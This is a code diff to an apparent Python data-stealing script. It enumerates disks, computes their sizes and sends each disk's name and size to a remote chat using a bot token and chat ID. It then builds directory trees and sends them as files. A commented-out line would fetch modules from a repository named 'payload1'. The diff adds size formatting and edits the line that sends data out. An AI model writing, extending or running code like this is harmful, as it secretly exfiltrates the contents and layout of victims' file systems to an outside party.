@@ -141,6 +141,12 @@ def get_folder_size(folder_path):
         pass
     return total_size
 
+def format_size(size_bytes):
+    if size_bytes == 0:
+        return "0 Go"
+    size_gb = size_bytes / (1024 ** 3)
+    return f"{size_gb:.2f}"
+
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
@@ -153,8 +159,10 @@ disks = scan_disks(1)
 for disks in disks:
     #Calcul disk size
     total_size = get_folder_size(disks)
+    total_size = format_size(total_size)
+    print(total_size)
     #Send infos
-    send_message(chat_id, token, disks + " : " + str(total_size))
+    send_message(chat_id, token, disks + " : " + total_size + " go")
     #Tree
     disk, temp_file_path = process_path(chat_id, token, disks)
     #Send file
